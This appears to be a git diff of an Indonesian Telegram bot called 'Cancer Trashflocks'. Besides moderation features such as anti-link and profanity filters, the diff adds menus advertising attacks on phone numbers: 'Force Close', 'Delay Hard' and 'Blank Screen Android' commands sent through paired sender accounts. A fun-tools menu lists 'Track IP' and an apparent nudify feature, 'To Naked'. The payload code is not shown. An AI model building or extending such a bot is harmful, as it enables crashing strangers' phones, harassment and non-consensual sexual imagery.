@@ -47,8 +47,10 @@ const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 // GAMBAR — ubah URL di sini untuk update
 // gambar semua user sekaligus
 // ══════════════════════════════════════════
-// Ganti URL ini sesuai foto maintenance kamu
+// Ganti URL foto sesuai kebutuhan kamu di sini
 const MAINTENANCE_IMAGE = "https://files.catbox.moe/dlw57p.jpg";
+const WARNING_IMAGE      = "https://files.catbox.moe/a5sbpo.jpg"; // ganti dengan foto warning kamu
+const CONNECT_IMAGE      = "https://files.catbox.moe/won2q9.jpg"; // ganti dengan foto connect kamu
 
 const IMAGES = {
     start:    "https://files.catbox.moe/klib41.jpg",
@@ -188,7 +190,7 @@ async function checkTokenFast() {
         const isValid = tokens.includes(TOKEN_BOT);
 
         if (isValid) {
-            console.log(chalk.green("✅ Token terdaftar, bot diizinkan."));
+            console.log(chalk.green("✔️ Token terdaftar, bot diizinkan."));
         } else {
             console.log(chalk.red("❌ Token TIDAK terdaftar di GitHub."));
         }
@@ -402,7 +404,7 @@ const checkOwnerOrAdmin = (ctx, next) => {
             [{ command: 'start', description: 'Show All Fiture By Cancer' }],
             { scope: { type: 'all_group_chats' } }
         );
-        console.log("✅ Commands berhasil didaftarkan.");
+        console.log("✔️ Commands berhasil didaftarkan.");
     } catch (e) {
         console.log("Set commands error:", e?.message);
     }
@@ -433,7 +435,7 @@ bot.use(async (ctx, next) => {
                         `<pre><code class="language-yaml">` +
                         `╔══════ CANCER TRASHFLOCKS ══════╗\n\n` +
                         `  Status  : Under Maintenance\n` +
-                        `  Creator      : @XnnxDxC\n\n` +
+                        `  Creator      : @Pelecehann\n\n` +
                         `  Bot sedang ofline, bot di matikan oleh owner.\n` +
                         `  Harap tunggu, kami akan\n` +
                         `  segera kembali online.\n\n` +
@@ -494,6 +496,27 @@ bot.use((ctx, next) => {
 // ==========================================
 // [ ANTI-FEATURES MIDDLEWARE UNTUK GRUP ]
 // ==========================================
+
+async function sendWarning(ctx, chatId, icon, label, violatorId, violatorName) {
+    const caption =
+        `<pre><code class="language-yaml">` +
+        `╔══════ WARNING ══════════════╗\n\n` +
+        `  ${icon} ${label.toUpperCase()} AKTIF\n\n` +
+        `  User   : ${violatorName}\n` +
+        `  ID     : ${violatorId}\n` +
+        `  Grup   : ${ctx.chat.title || "-"}\n` +
+        `  Status : Pesan Dihapus ❌\n\n` +
+        `  Tindakan ini melanggar\n` +
+        `  aturan grup!\n\n` +
+        `╚══════════════════════════════╝` +
+        `</code></pre>`;
+    const m = await ctx.telegram.sendPhoto(chatId, WARNING_IMAGE, {
+        caption,
+        parse_mode: "HTML"
+    }).catch(() => null);
+    if (m) setTimeout(() => ctx.telegram.deleteMessage(chatId, m.message_id).catch(() => {}), 8000);
+}
+
 bot.use(async (ctx, next) => {
     try {
         if (!isGroup(ctx)) return next();
@@ -501,16 +524,16 @@ bot.use(async (ctx, next) => {
         const msg = ctx.message;
         if (!msg) return next();
         const userId = ctx.from?.id;
+        const userName = ctx.from?.first_name || "Unknown";
 
         // Owner & admin bebas dari anti-features
         if (isOwnerOrAdmin(userId)) return next();
 
         // ── ANTI FORWARD ──
-        if (getMurbugSetting(chatId, "antiforward") && msg.forward_from || msg.forward_from_chat || msg.forward_sender_name) {
+        if (getMurbugSetting(chatId, "antiforward") && (msg.forward_from || msg.forward_from_chat || msg.forward_sender_name)) {
             await ctx.deleteMessage().catch(() => {});
-            return ctx.replyWithHTML(`<b>🚫 ANTI FORWARD AKTIF</b>\n<i>Pesan forward tidak diizinkan di grup ini!</i>`).then(m => {
-                setTimeout(() => ctx.telegram.deleteMessage(chatId, m.message_id).catch(() => {}), 5000);
-            }).catch(() => {});
+            await sendWarning(ctx, chatId, "↩️", "Anti Forward", userId, userName);
+            return;
         }
 
         // ── ANTI LINK ──
@@ -518,45 +541,50 @@ bot.use(async (ctx, next) => {
             const linkRegex = /(https?:\/\/[^\s]+|t\.me\/[^\s]+|www\.[^\s]+)/gi;
             if (linkRegex.test(msg.text)) {
                 await ctx.deleteMessage().catch(() => {});
-                return ctx.replyWithHTML(`<b>🔗 ANTI LINK AKTIF</b>\n<i>Pengiriman link tidak diizinkan di grup ini!</i>`).then(m => {
-                    setTimeout(() => ctx.telegram.deleteMessage(chatId, m.message_id).catch(() => {}), 5000);
-                }).catch(() => {});
+                await sendWarning(ctx, chatId, "🔗", "Anti Link", userId, userName);
+                return;
             }
         }
 
         // ── ANTI PROMOSI ──
         if (getMurbugSetting(chatId, "antipromosi") && msg.text) {
-            const promoRegex = /(join|invite|promo|diskon|jual|beli|order|wa\.me|bit\.ly|shopee|tokopedia|olshop|bayar|harga|murah)/gi;
+            const promoRegex = /(join|invite|promo|diskon|jual|beli|order|wa\.me|bit\.ly|shopee|sel|tokopedia|open|olshop|bayar|harga|murah)/gi;
             if (promoRegex.test(msg.text)) {
                 await ctx.deleteMessage().catch(() => {});
-                return ctx.replyWithHTML(`<b>📢 ANTI PROMOSI AKTIF</b>\n<i>Promosi tidak diizinkan di grup ini!</i>`).then(m => {
-                    setTimeout(() => ctx.telegram.deleteMessage(chatId, m.message_id).catch(() => {}), 5000);
-                }).catch(() => {});
+                await sendWarning(ctx, chatId, "📢", "Anti Promosi", userId, userName);
+                return;
             }
         }
 
         // ── ANTI FOTO ──
         if (getMurbugSetting(chatId, "antifoto") && (msg.photo || msg.document?.mime_type?.startsWith("image/"))) {
             await ctx.deleteMessage().catch(() => {});
-            return ctx.replyWithHTML(`<b>📷 ANTI FOTO AKTIF</b>\n<i>Pengiriman foto tidak diizinkan di grup ini!</i>`).then(m => {
-                setTimeout(() => ctx.telegram.deleteMessage(chatId, m.message_id).catch(() => {}), 5000);
-            }).catch(() => {});
+            await sendWarning(ctx, chatId, "📷", "Anti Foto", userId, userName);
+            return;
         }
 
         // ── ANTI VIDEO ──
         if (getMurbugSetting(chatId, "antivideo") && (msg.video || msg.video_note || msg.document?.mime_type?.startsWith("video/"))) {
             await ctx.deleteMessage().catch(() => {});
-            return ctx.replyWithHTML(`<b>🎥 ANTI VIDEO AKTIF</b>\n<i>Pengiriman video tidak diizinkan di grup ini!</i>`).then(m => {
-                setTimeout(() => ctx.telegram.deleteMessage(chatId, m.message_id).catch(() => {}), 5000);
-            }).catch(() => {});
+            await sendWarning(ctx, chatId, "🎥", "Anti Video", userId, userName);
+            return;
         }
 
         // ── ANTI STIKER ──
         if (getMurbugSetting(chatId, "antistiker") && msg.sticker) {
             await ctx.deleteMessage().catch(() => {});
-            return ctx.replyWithHTML(`<b>🎭 ANTI STIKER AKTIF</b>\n<i>Pengiriman stiker tidak diizinkan di grup ini!</i>`).then(m => {
-                setTimeout(() => ctx.telegram.deleteMessage(chatId, m.message_id).catch(() => {}), 5000);
-            }).catch(() => {});
+            await sendWarning(ctx, chatId, "🎭", "Anti Stiker", userId, userName);
+            return;
+        }
+
+        // ── ANTI TOXIC ──
+        if (getMurbugSetting(chatId, "antitoxic") && msg.text) {
+            const toxicWords = /(anjing|bangsat|babi|kontol|memek|tolol|bodoh|goblok|idiot|kampret|bajingan|sialan|yatim|keparat|tai|jancok|asu)/gi;
+            if (toxicWords.test(msg.text)) {
+                await ctx.deleteMessage().catch(() => {});
+                await sendWarning(ctx, chatId, "☠️", "Anti Toxic", userId, userName);
+                return;
+            }
         }
 
         return next();
@@ -581,15 +609,15 @@ const btnUtama = {
         return {
             inline_keyboard: [
                 [
-                    { text: "LIST TRASH", callback_data: "listtrash", style: style, icon_custom_emoji_id: "5465225015190367274" },
-                    { text: "SUP FITURE", callback_data: "fiturpg1", style: style, icon_custom_emoji_id: "5465262274031659421" }
+                    { text: "🚬 LIST TRASH", callback_data: "listtrash", style: style, icon_custom_emoji_id: "5465225015190367274" },
+                    { text: "🧉 FITURE", callback_data: "fitureMenu", style: style, icon_custom_emoji_id: "5465262274031659421" }
                 ],
                 [
-                    { text: "IND FITURE", callback_data: "fiturpg2", style: style, icon_custom_emoji_id: "5463121572137022242" },
-                    { text: "THANKS TO", callback_data: "tqto", style: style, icon_custom_emoji_id: "5463412289883353404" },
+                    { text: "🧱 CONNECT", callback_data: "connectMenu", style: style, icon_custom_emoji_id: "5463121572137022242" },
+                    { text: "🛖 THANKS TO", callback_data: "tqto", style: style, icon_custom_emoji_id: "5463412289883353404" },
                 ],
                 [
-                    { text: "CREATOR", url: "https://t.me/xnnxdxc", style: style, icon_custom_emoji_id: "5463156928307801722" }
+                    { text: "⛱ CREATOR", url: "https://t.me/xnnxdxc", style: style, icon_custom_emoji_id: "5463156928307801722" }
                 ]
             ]
         };
@@ -620,6 +648,126 @@ function getPrivateMainKeyboard() {
 const btnKembali = {
     inline_keyboard: [
         [{ text: "BACK TO START", callback_data: "back_start", style: "Primary" }]
+    ]
+};
+
+// ─── FITURE sub-menu ───
+const btnFitureMenu = {
+    inline_keyboard: [
+        [
+            { text: "🏯 GROUP", callback_data: "fitureGroup", style: "Danger" },
+            { text: "🎠 MURBUG", callback_data: "fiture_murbug", style: "Danger" }
+        ],
+        [
+            { text: "⚙️ CONTROL", callback_data: "fitureControl", style: "Primary" },
+            { text: "🛝 PLAYED", callback_data: "fiture_played", style: "Primary" }
+        ],
+        [{ text: "KEMBALI", callback_data: "back_start", style: "Primary" }]
+    ]
+};
+
+// ─── GROUP sub-menu ───
+const btnGroupMenu = {
+    inline_keyboard: [
+        [
+            { text: "↩️ Anti Forward", callback_data: "tgl_antiforward", style: "Primary" },
+            { text: "🔗 Anti Link", callback_data: "tgl_antilink", style: "Primary" }
+        ],
+        [
+            { text: "📢 Anti Promosi", callback_data: "tgl_antipromosi", style: "Danger" },
+            { text: "📷 Anti Foto", callback_data: "tgl_antifoto", style: "Danger" }
+        ],
+        [
+            { text: "🎥 Anti Video", callback_data: "tgl_antivideo", style: "Success" },
+            { text: "🎭 Anti Stiker", callback_data: "tgl_antistiker", style: "Success" }
+        ],
+        [
+            { text: "☠️ Anti Toxic", callback_data: "tgl_antitoxic", style: "Primary" },
+            { text: "📊 Status Anti", callback_data: "statusAnti", style: "Primary" }
+        ],
+        [{ text: "KEMBALI", callback_data: "fitureMenu", style: "Primary" }]
+    ]
+};
+
+// ─── MURBUG sub-menu ───
+const btnMurbugMenu = {
+    inline_keyboard: [
+        [
+            { text: "➕ Add Premium", callback_data: "mb_addprem", style: "Danger" },
+            { text: "➖ Del Premium", callback_data: "mb_delprem", style: "Danger" }
+        ],
+        [
+            { text: "👑 Add Admin", callback_data: "mb_addadmin", style: "Primary" },
+            { text: "🗑️ Del Admin", callback_data: "mb_deladmin", style: "Primary" }
+        ],
+        [
+            { text: "🚫 Block CMD", callback_data: "mb_blockcmd", style: "Success" },
+            { text: "✔️ Del Block", callback_data: "mb_delblock", style: "Success" }
+        ],
+        [
+            { text: "🏘️ Add Murbug", callback_data: "mb_addmurbug", style: "Primary" },
+            { text: "❌ Del Murbug", callback_data: "mb_delmurbug", style: "Primary" }
+        ],
+        [{ text: "📋 List Murbug", callback_data: "mb_listmurbug", style: "Danger" }],
+        [{ text: "KEMBALI", callback_data: "fitureMenu", style: "Primary" }]
+    ]
+};
+
+// ─── CONTROL sub-menu ───
+const btnControlMenu = {
+    inline_keyboard: [
+        [
+            { text: "🔧 Maintenance ON", callback_data: "ctrl_mainton", style: "Danger" },
+            { text: "✔️ Maintenance OFF", callback_data: "ctrl_maintoff", style: "Danger" }
+        ],
+        [{ text: "📢 Set Channel", callback_data: "ctrl_setchannel", style: "Primary" }],
+        [{ text: "KEMBALI", callback_data: "fitureMenu", style: "Primary" }]
+    ]
+};
+
+// ─── PLAYED sub-menu ───
+const btnPlayedMenu = {
+    inline_keyboard: [
+        [
+            { text: "🧠 IQ Test",    callback_data: "pl_iqtest", style: "Primary" },
+            { text: "🎵 Brat",       callback_data: "pl_brat", style: "Primary" }
+        ],
+        [
+            { text: "🌐 Get Code",   callback_data: "pl_getcode", style: "Danger" },
+            { text: "📍 Track IP",   callback_data: "pl_trackip", style: "Danger" }
+        ],
+        [
+            { text: "🎵 TikTok DL",  callback_data: "pl_tiktokdl", style: "Success" },
+            { text: "🔗 To URL",     callback_data: "pl_tourl", style: "Success" }
+        ],
+        [
+            { text: "🖼️ To Naked",   callback_data: "pl_tonaked", style: "Primary" },
+            { text: "📄 Enc HTML",   callback_data: "pl_enchtml", style: "Primary" }
+        ],
+        [
+            { text: "📱 SS iPhone",  callback_data: "pl_ssiphone", style: "Danger" },
+            { text: "🗂️ C Sessions", callback_data: "pl_csessions", style: "Danger" }
+        ],
+        [{ text: "KEMBALI", callback_data: "fitureMenu", style: "Success" }]
+    ]
+};
+
+// ─── LIST TRASH sub-menu ───
+const btnTrashMenu = {
+    inline_keyboard: [
+        [
+            { text: "💀 MURBUG SPAM", callback_data: "trash_murbug", style: "Danger" },
+            { text: "🔒 PRIVAT BUGS", callback_data: "trash_privat", style: "Primary" }
+        ],
+        [{ text: "KEMBALI", callback_data: "back_start", style: "Succes" }]
+    ]
+};
+
+// ─── CONNECT sub-menu (info cara connect) ───
+const btnConnectMenu = {
+    inline_keyboard: [
+        [{ text: "📋 List Sender", callback_data: "conn_listsender", style: "Danger" }],
+        [{ text: "KEMBALI", callback_data: "back_start", style: "Primary" }]
     ]
 };
 
@@ -752,7 +900,7 @@ bot.start(async (ctx) => {
             ctx.session.isAuthorized = true;
             delete codes[userCode];
             saveAccessCodes(codes);
-            await ctx.reply("✅ Kode Benar! Bot diaktifkan.");
+            await ctx.reply("✔️ Kode Benar! Bot diaktifkan.");
         }
 
         // Tampil menu private
@@ -856,41 +1004,107 @@ bot.command("creatkode", async (ctx) => {
 // ==========================================
 // [ ACTIONS GRUP ONLY ]
 // ==========================================
+// ─── LIST TRASH → tampilkan 2 button dulu ───
 bot.action("listtrash", async (ctx) => {
     if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
     const gagahMsg =
-        `<blockquote expandable>💀 <b>CANCER TRASHFLOCKS — WEAPON LIST</b> 💀</blockquote>\n` +
+        `<blockquote expandable>💀 <b>CANCER TRASHFLOCKS — PILIH MODE</b> 💀</blockquote>\n` +
         `<pre><code class="language-yaml">` +
-        `╔═══════ TRASH ARSENAL ════════╗\n\n` +
-        `  /trash\n` +
-        `  ├ Type    : Forclose Attack\n` +
-        `  ├ Level   : ██████████ ULTRA%\n` +
-        `  └ Status  : NEW ✦\n\n` +
-        `  /invasion\n` +
-        `  ├ Type    : Combination Strike\n` +
-        `  ├ Level   : ████████░░ HIGHT%\n` +
-        `  └ Status  : NEW ✦\n\n` +
-        `  /omega\n` +
-        `  ├ Type    : Delay Hard\n` +
-        `  ├ Level   : ███████░░░ 99%\n` +
-        `  └ Status  : ACTIVE\n\n` +
-        `  /kuantum\n` +
-        `  ├ Type    : Delay Combination\n` +
-        `  ├ Level   : ████████░░ 99%\n` +
-        `  └ Status  : ACTIVE\n\n` +
-        `  /modols\n` +
-        `  ├ Type    : Blank Android\n` +
-        `  ├ Level   : ████████░░ 99%\n` +
-        `  └ Status  : ACTIVE\n\n` +
+        `╔═══════ TRASH MENU ═══════════╗\n\n` +
+        `  Pilih mode serangan::\n\n` +
+        `  💀 MURBUG SPAM\n` +
+        `  └ Semua fitur bug untuk\n` +
+        `    grup murbug terdaftar\n\n` +
+        `  🔒 PRIVAT BUGS\n` +
+        `  └ Bug khusus private chat\n` +
+        `    & nomor target langsung\n\n` +
         `╚══════════════════════════════╝` +
-        `</code></pre>\n` +
-        `<blockquote><i>💀 "Target identified. No mercy, no remnants." 💀</i></blockquote>`;
+        `</code></pre>`;
     try {
-        await ctx.editMessageCaption(gagahMsg, { parse_mode: "HTML", reply_markup: btnKembali });
+        await ctx.editMessageCaption(gagahMsg, { parse_mode: "HTML", reply_markup: btnTrashMenu });
         await ctx.answerCbQuery();
     } catch (e) {
         await ctx.answerCbQuery().catch(() => {});
-        if (!e?.message?.includes("message is not modified")) console.log("list_trash error:", e?.message);
+        if (!e?.message?.includes("message is not modified")) console.log("listtrash error:", e?.message);
+    }
+});
+
+// ─── TRASH MURBUG ───
+bot.action("trash_murbug", async (ctx) => {
+    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
+    const murbugMsg =
+        `<blockquote expandable>💀 <b>MURBUG SPAM — ARSENAL</b> 💀</blockquote>\n` +
+        `<pre><code class="language-yaml">` +
+        `╔════════════════════════════════╗\n` +
+        `║   ░▒▓ CANCER WEAPONS ▓▒░      ║\n` +
+        `╠════════════════════════════════╣\n\n` +
+        `  ⚡ /trash\n` +
+        `  │  Forclose Attack — NEW\n` +
+        `  │  ██████████ [ ULTRA ]\n\n` +
+        `  💥 /invasion\n` +
+        `  │  Combination Strike — NEW\n` +
+        `  │  ████████░░ [ HIGH ]\n\n` +
+        `  🔥 /omega\n` +
+        `  │  Delay Hard Attack\n` +
+        `  │  █████████░ [ MAX ]\n\n` +
+        `  🌀 /kuantum\n` +
+        `  │  Quantum Delay Combo\n` +
+        `  │  ████████░░ [ HIGH ]\n\n` +
+        `  💣 /modols\n` +
+        `  │  Blank Android Strike\n` +
+        `  │  ████████░░ [ HIGH ]\n\n` +
+        `╠════════════════════════════════╣\n` +
+        `║  "No mercy. No remnants."      ║\n` +
+        `╚════════════════════════════════╝` +
+        `</code></pre>`;
+    try {
+        await ctx.editMessageCaption(murbugMsg, { parse_mode: "HTML", reply_markup: {
+            inline_keyboard: [[{ text: "◀ KEMBALI", callback_data: "listtrash", style: "Danger" }]]
+        }});
+        await ctx.answerCbQuery();
+    } catch (e) {
+        await ctx.answerCbQuery().catch(() => {});
+        if (!e?.message?.includes("message is not modified")) console.log("trash_murbug error:", e?.message);
+    }
+});
+
+// ─── TRASH PRIVAT → isi sama seperti trashshow privat ───
+bot.action("trash_privat", async (ctx) => {
+    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
+    const privatMsg =
+        `<blockquote expandable>🔒 <b>PRIVAT BUGS — ARSENAL</b> 🔒</blockquote>\n` +
+        `<pre><code class="language-yaml">` +
+        `╔════════════════════════════════╗\n` +
+        `║   ░▒▓ PRIVAT WEAPONS ▓▒░      ║\n` +
+        `╠════════════════════════════════╣\n\n` +
+        `  ☠️  /cancerforce [62xx]\n` +
+        `  │  Force Close Attack\n` +
+        `  │  ████░█████ [ ULTRA ]\n\n` +
+        `  💀 /cancercombi [62xx]\n` +
+        `  │  Combination Strike\n` +
+        `  │  █████░████ [ HIGH ]\n\n` +
+        `  🔥 /cancerdelay [62xx]\n` +
+        `  │  Delay Hard Attack\n` +
+        `  │  ████░█████ [ MAX ]\n\n` +
+        `  🌑 /cancerblank [62xx]\n` +
+        `  │  Blank Screen Android\n` +
+        `  │  █████░████ [ HIGH ]\n\n` +
+        `  💣 /cancercombo [62xx]\n` +
+        `  │  Full Combo Strike\n` +
+        `  │  ████░█████ [ ULTRA ]\n\n` +
+        `╠════════════════════════════════╣\n` +
+        `║  Butuh sender aktif dulu!      ║\n` +
+        `║  → /addsender 628xxx           ║\n` +
+        `╚════════════════════════════════╝` +
+        `</code></pre>`;
+    try {
+        await ctx.editMessageCaption(privatMsg, { parse_mode: "HTML", reply_markup: {
+            inline_keyboard: [[{ text: "◀ KEMBALI", callback_data: "listtrash", style: "Primary" }]]
+        }});
+        await ctx.answerCbQuery();
+    } catch (e) {
+        await ctx.answerCbQuery().catch(() => {});
+        if (!e?.message?.includes("message is not modified")) console.log("trash_privat error:", e?.message);
     }
 });
 
@@ -1017,6 +1231,348 @@ bot.action("fiturpg2", async (ctx) => {
 
 bot.action("none", async (ctx) => {
     await ctx.answerCbQuery().catch(() => {});
+});
+
+// ==========================================
+// [ FITURE MENU ACTION ]
+// ==========================================
+bot.action("fitureMenu", async (ctx) => {
+    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
+    const txt =
+        `<blockquote expandable>⚙️ <b>CANCER TRASHFLOCKS — FITURE</b> ⚙️</blockquote>\n` +
+        `<pre><code class="language-yaml">` +
+        `╔══════ FITURE MENU ═══════════╗\n\n` +
+        `  🛡️ GROUP    : Anti-features\n` +
+        `  👑 MURBUG   : Manajemen akses\n` +
+        `  ⚙️ CONTROL  : Maintenance\n` +
+        `  🎮 PLAYED   : Fun & Tools\n\n` +
+        `  Pilih menu di bawah:\n\n` +
+        `╚══════════════════════════════╝` +
+        `</code></pre>`;
+    try {
+        await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnFitureMenu });
+        await ctx.answerCbQuery();
+    } catch (e) {
+        await ctx.answerCbQuery().catch(() => {});
+        if (!e?.message?.includes("message is not modified")) console.log("fitureMenu error:", e?.message);
+    }
+});
+
+// ─── GROUP MENU ───
+bot.action("fitureGroup", async (ctx) => {
+    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
+    const chatId = ctx.chat.id.toString();
+    const on = "✔️"; const off = "❌";
+    const txt =
+        `<blockquote expandable>🛡️ <b>GROUP PROTECTION</b> 🛡️</blockquote>\n` +
+        `<pre><code class="language-yaml">` +
+        `╔══════ ANTI FEATURES ══════════╗\n\n` +
+        `  ↩️  Anti Forward  : ${getMurbugSetting(chatId,"antiforward") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
+        `  🔗  Anti Link     : ${getMurbugSetting(chatId,"antilink") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
+        `  📢  Anti Promosi  : ${getMurbugSetting(chatId,"antipromosi") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
+        `  📷  Anti Foto     : ${getMurbugSetting(chatId,"antifoto") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
+        `  🎥  Anti Video    : ${getMurbugSetting(chatId,"antivideo") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
+        `  🎭  Anti Stiker   : ${getMurbugSetting(chatId,"antistiker") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
+        `  ☠️  Anti Toxic    : ${getMurbugSetting(chatId,"antitoxic") ? "AKTIF  ✔️" : "OFF    ❌"}\n\n` +
+        `  Klik tombol untuk toggle:\n\n` +
+        `╚═══════════════════════════════╝` +
+        `</code></pre>`;
+    try {
+        await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnGroupMenu });
+        await ctx.answerCbQuery();
+    } catch (e) {
+        await ctx.answerCbQuery().catch(() => {});
+        if (!e?.message?.includes("message is not modified")) console.log("fitureGroup error:", e?.message);
+    }
+});
+
+// ─── TOGGLE ANTI via button ───
+const antiToggleMap = {
+    "tgl_antiforward": { key: "antiforward", icon: "↩️", label: "Anti Forward" },
+    "tgl_antilink":    { key: "antilink",    icon: "🔗", label: "Anti Link" },
+    "tgl_antipromosi": { key: "antipromosi", icon: "📢", label: "Anti Promosi" },
+    "tgl_antifoto":    { key: "antifoto",    icon: "📷", label: "Anti Foto" },
+    "tgl_antivideo":   { key: "antivideo",   icon: "🎥", label: "Anti Video" },
+    "tgl_antistiker":  { key: "antistiker",  icon: "🎭", label: "Anti Stiker" },
+    "tgl_antitoxic":   { key: "antitoxic",   icon: "☠️", label: "Anti Toxic" },
+};
+
+Object.entries(antiToggleMap).forEach(([action, { key, icon, label }]) => {
+    bot.action(action, async (ctx) => {
+        if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
+        if (!isOwnerOrAdmin(ctx.from.id)) return ctx.answerCbQuery("❌ Akses ditolak!").catch(() => {});
+        const chatId = ctx.chat.id.toString();
+        const newVal = !getMurbugSetting(chatId, key);
+        setMurbugSetting(chatId, key, newVal);
+        await ctx.answerCbQuery(`${icon} ${label}: ${newVal ? "AKTIF ✔️" : "NONAKTIF ❌"}`).catch(() => {});
+        // Refresh tampilan
+        const on = "✔️"; const off = "❌";
+        const txt =
+            `<blockquote expandable>🛡️ <b>GROUP PROTECTION</b> 🛡️</blockquote>\n` +
+            `<pre><code class="language-yaml">` +
+            `╔══════ ANTI FEATURES ══════════╗\n\n` +
+            `  ↩️  Anti Forward  : ${getMurbugSetting(chatId,"antiforward") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
+            `  🔗  Anti Link     : ${getMurbugSetting(chatId,"antilink") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
+            `  📢  Anti Promosi  : ${getMurbugSetting(chatId,"antipromosi") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
+            `  📷  Anti Foto     : ${getMurbugSetting(chatId,"antifoto") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
+            `  🎥  Anti Video    : ${getMurbugSetting(chatId,"antivideo") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
+            `  🎭  Anti Stiker   : ${getMurbugSetting(chatId,"antistiker") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
+            `  ☠️  Anti Toxic    : ${getMurbugSetting(chatId,"antitoxic") ? "AKTIF  ✔️" : "OFF    ❌"}\n\n` +
+            `  Klik tombol untuk toggle:\n\n` +
+            `╚═══════════════════════════════╝` +
+            `</code></pre>`;
+        await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnGroupMenu }).catch(() => {});
+    });
+});
+
+bot.action("statusAnti", async (ctx) => {
+    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
+    await ctx.answerCbQuery("Ini status real-time semua anti-features").catch(() => {});
+});
+
+// ─── MURBUG MENU ───
+bot.action("fiture_murbug", async (ctx) => {
+    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
+    const txt =
+        `<blockquote expandable>👑 <b>MURBUG MANAGEMENT</b> 👑</blockquote>\n` +
+        `<pre><code class="language-yaml">` +
+        `╔══════ MURBUG MENU ════════════╗\n\n` +
+        `  Gunakan command berikut:\n\n` +
+        `  Premium\n` +
+        `  ├ /addprem @user\n` +
+        `  └ /delprem @user\n\n` +
+        `  Admin\n` +
+        `  ├ /addadmin @user\n` +
+        `  └ /deladmin @user\n\n` +
+        `  Block CMD\n` +
+        `  ├ /blockcmd [cmd]\n` +
+        `  ├ /delblockcmd [cmd]\n` +
+        `  └ /listblockcmd\n\n` +
+        `  Murbug\n` +
+        `  ├ /addmurbug\n` +
+        `  ├ /delmurbug\n` +
+        `  └ /listmurbug\n\n` +
+        `╚═══════════════════════════════╝` +
+        `</code></pre>`;
+    try {
+        await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnMurbugMenu });
+        await ctx.answerCbQuery();
+    } catch (e) {
+        await ctx.answerCbQuery().catch(() => {});
+    }
+});
+
+// Button MURBUG menu → redirect ke command info
+["mb_addprem","mb_delprem","mb_addadmin","mb_deladmin","mb_blockcmd","mb_delblock","mb_addmurbug","mb_delmurbug"].forEach(a => {
+    bot.action(a, async (ctx) => {
+        const map = {
+            "mb_addprem":   "/addprem @username",
+            "mb_delprem":   "/delprem @username",
+            "mb_addadmin":  "/addadmin @username",
+            "mb_deladmin":  "/deladmin @username",
+            "mb_blockcmd":  "/blockcmd [nama_command]",
+            "mb_delblock":  "/delblockcmd [nama_command]",
+            "mb_addmurbug": "/addmurbug (di grup tujuan)",
+            "mb_delmurbug": "/delmurbug (di grup tujuan)",
+        };
+        await ctx.answerCbQuery(`Ketik: ${map[a]}`).catch(() => {});
+    });
+});
+
+bot.action("mb_listmurbug", async (ctx) => {
+    if (!isGroup(ctx)) return ctx.answerCbQuery().catch(() => {});
+    // Tampilkan listmurbug inline
+    try {
+        const data = loadJSON(murbugFile);
+        const settings = loadMurbugSettings();
+        let list =
+            `<pre><code class="language-yaml">` +
+            `╔══════ MURBUG LIST ════════════╗\n\n` +
+            `  Total : ${data.length} Grup\n\n`;
+        if (data.length === 0) {
+            list += `  Belum ada grup terdaftar.\n\n`;
+        } else {
+            data.forEach((id, i) => {
+                const s = settings[id] || {};
+                list += `  [${i+1}] ${id}\n`;
+            });
+            list += `\n`;
+        }
+        list += `╚═══════════════════════════════╝</code></pre>`;
+        await ctx.editMessageCaption(list, { parse_mode: "HTML", reply_markup: {
+            inline_keyboard: [[{ text: "KEMBALI", callback_data: "fiture_murbug", style: "Primary" }]]
+        }});
+        await ctx.answerCbQuery();
+    } catch (e) { await ctx.answerCbQuery().catch(() => {}); }
+});
+
+// ─── CONTROL MENU ───
+bot.action("fitureControl", async (ctx) => {
+    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
+    const status = loadMaintenance() ? "🔴 MAINTENANCE ON" : "🟢 ONLINE";
+    const txt =
+        `<blockquote expandable>⚙️ <b>CONTROL PANEL</b> ⚙️</blockquote>\n` +
+        `<pre><code class="language-yaml">` +
+        `╔══════ CONTROL MENU ═══════════╗\n\n` +
+        `  Bot Status : ${status}\n\n` +
+        `  🔧 Maintenance\n` +
+        `  ├ ON  → Block semua user\n` +
+        `  └ OFF → Bot normal kembali\n\n` +
+        `  📢 Set Channel\n` +
+        `  └ Edit CHANNEL_USERNAME\n` +
+        `    di settings/config.js\n\n` +
+        `╚═══════════════════════════════╝` +
+        `</code></pre>`;
+    try {
+        await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnControlMenu });
+        await ctx.answerCbQuery();
+    } catch (e) {
+        await ctx.answerCbQuery().catch(() => {});
+    }
+});
+
+bot.action("ctrl_mainton", async (ctx) => {
+    if (!isOwner(ctx)) return ctx.answerCbQuery("❌ Khusus Owner!").catch(() => {});
+    saveMaintenance(true);
+    await ctx.answerCbQuery("🔧 Maintenance AKTIF!").catch(() => {});
+    // Refresh control menu
+    const txt =
+        `<blockquote expandable>⚙️ <b>CONTROL PANEL</b> ⚙️</blockquote>\n` +
+        `<pre><code class="language-yaml">` +
+        `╔══════ CONTROL MENU ═══════════╗\n\n` +
